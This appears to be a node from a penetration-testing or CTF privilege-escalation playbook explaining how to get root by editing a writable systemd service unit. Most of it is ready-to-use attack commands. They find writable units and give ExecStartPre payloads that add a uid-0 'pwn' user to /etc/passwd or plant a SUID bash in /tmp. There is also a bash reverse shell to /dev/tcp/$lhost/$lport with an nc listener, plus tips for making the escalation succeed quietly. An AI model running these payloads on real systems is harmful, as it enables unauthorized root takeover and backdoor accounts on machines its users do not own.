title: Writable systemd Service — Unit File to Root
body:
If you can write a systemd .service unit (or its directory), you can run a command as ROOT — units run as root by default. linpeas flags these under 'interesting GROUP writable files'; the classic is a unit in /etc/systemd/system/ that's group-writable by your user.

FOUR TRAPS that make this fail silently (all four bit a real box):

1. ExecStart is NOT a shell. systemd parses it into argv — it does NOT interpret ; | >& redirects. A reverse shell must be wrapped: ExecStart=/bin/bash -c '...'. A bare 'flask run; bash -i >& ...' never runs the bash half.

2. User= downgrades you. If the unit has User=cmeeks, your payload runs as that user, not root — useless for escalation. DELETE the User= line so it runs as root (the default).

3. Don't kill the legit service. If the unit runs a real app (e.g. flask on a port you reconnect through), REPLACING ExecStart causes an outage AND can cut your own access. Keep the original ExecStart and bolt your payload on with ExecStartPre= — runs as root before the app, app still comes up.

4. The $ escaping landmine. systemd treats $ as a variable, so a password hash like $1$abc$... gets mangled and a BROKEN hash lands in /etc/passwd — su then silently rejects you. Escape every $ as $$, or sidestep it by generating the hash inline with openssl (no $ in the file).

You still need a way to (re)start the unit — see the restart-trigger node. WantedBy=multi-user.target means it fires at boot, so even just 'sudo reboot' detonates it.
cmd:
# ════════════════════════════════════════════════════════
# 1. FIND writable units + confirm it boots
# ════════════════════════════════════════════════════════
find /etc/systemd/system -writable -type f 2>/dev/null
ls -la /etc/systemd/system/*.service
systemctl is-enabled <name>      # 'enabled' = pulled in at boot → reboot trigger works

# ════════════════════════════════════════════════════════
# 2A. ADD A ROOT USER  (best when the trigger is a reboot)
# ════════════════════════════════════════════════════════
# Keep the real ExecStart so the app/port returns; add payload as ExecStartPre.
# Drop User=. Use the openssl-INLINE hash to dodge the $$ escaping trap.
# ExecStartPre line to insert into [Service]:
ExecStartPre=-/bin/bash -c "echo 'pwn:'$(openssl passwd -1 pwned)':0:0:root:/root:/bin/bash' >> /etc/passwd"
#   leading '-' = ignore failure so the real service still starts
#   after trigger:  su pwn   (password: pwned)  ->  id = uid=0

# If you must embed a PRE-MADE hash, escape every $ as $$:
#   ExecStart=/bin/bash -c "echo 'pwn:$$1$$abc$$HASH:0:0:root:/root:/bin/bash' >> /etc/passwd"

# ════════════════════════════════════════════════════════
# 2B. SUID BASH  (simplest; no listener, survives reboot timing)
# ════════════════════════════════════════════════════════
ExecStartPre=-/bin/bash -c 'cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash'
#   after trigger:  /tmp/rootbash -p   ->  root

# ════════════════════════════════════════════════════════
# 2C. REVERSE SHELL  (only if you can start it on demand, not via slow reboot)
# ════════════════════════════════════════════════════════
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/$lhost/$lport 0>&1'
#   listener:  nc -nlvp $lport   (must wrap in bash -c — ExecStart is not a shell)

# ════════════════════════════════════════════════════════
# 3. VALIDATE before committing (a reboot is one-way)
# ════════════════════════════════════════════════════════
systemd-analyze verify /etc/systemd/system/<name>.service   # catches parse errors
cp /etc/systemd/system/<name>.service /tmp/unit.bak          # back up the original
warn: 'exit code 1 / nothing happened' is almost always one of the four traps: ExecStart treated as non-shell, User= still present, a mangled $-hash, or the unit never restarted. Validate with systemd-analyze, keep the original ExecStart if a real service depends on it, and remember a reboot is committing — verify the hash matches the password (openssl passwd -1 -salt abc pwned should reproduce it) BEFORE you reboot. Clean up afterward: restore the unit and 'sed -i /^pwn:/d /etc/passwd'.

choices.label: Only have sudo reboot/halt — can I trigger it?
Need a reverse shell instead of a user
